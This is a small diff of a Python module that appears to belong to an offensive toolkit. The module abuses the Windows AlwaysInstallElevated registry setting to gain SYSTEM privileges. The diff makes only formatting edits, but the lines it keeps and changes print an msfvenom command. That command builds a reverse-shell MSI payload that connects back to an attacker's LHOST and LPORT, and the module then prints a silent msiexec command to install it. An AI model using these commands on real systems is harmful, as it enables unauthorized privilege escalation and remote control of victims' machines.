@@ -1,6 +1,5 @@
-"""AlwaysInstallElevated registry abuse — MSI payload → SYSTEM."""
+"""AlwaysInstallElevated registry abuse  -  MSI payload → SYSTEM."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -26,7 +25,7 @@ def run(args: Any) -> int:
 
     if lhost:
         print("\n[*] Generate MSI payload:")
-        print("  msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f msi -o evil.msi".format(lhost, lport))
+        print(f"  msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o evil.msi")
     print("\n[*] Execute: msiexec /quiet /qn /i evil.msi")
 
     return 0
